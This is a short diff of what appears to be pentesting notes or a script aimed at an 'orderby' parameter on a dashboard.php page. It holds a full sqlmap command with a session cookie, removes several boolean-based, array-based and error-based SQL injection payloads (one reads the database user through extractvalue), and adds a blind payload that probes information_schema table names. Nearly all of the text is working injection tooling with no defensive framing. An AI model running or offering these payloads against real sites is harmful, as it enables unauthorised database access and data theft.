@@ -238,10 +238,4 @@ if __name__ == "__main__":
 
 
 sqlmap -u "http://example.com/dashboard.php?orderby=submission_time&order=DESC" --cookie="PHPSESSID=your_token" -p orderby --technique=TB --level=3 --risk=2 --dbms=mysql --batch
-?orderby=(CASE+WHEN+(1=1)+THEN+id+ELSE+name+END)&order=ASC
-?orderby=(CASE+WHEN+(1=2)+THEN+id+ELSE+name+END)&order=ASC
-?orderby[0]=id&orderby[1]=AND&orderby[2]=1=1
-orderby[0]=id&orderby[1]=LIMIT&orderby[2]=1,1
-?orderby=(extractvalue(1,concat(0x7e,(select+user()),0x7e)))
-?orderby=id+(CASE+WHEN+(1=1)+THEN+id+ELSE+id+END)
-?orderby=id, (CASE WHEN (SELECT 1)=1 THEN name ELSE id END)
+?orderby=(CASE+WHEN+(length((select+table_name+from+information_schema.tables+limit+0,1))>1)+THEN+id+ELSE+name+END)
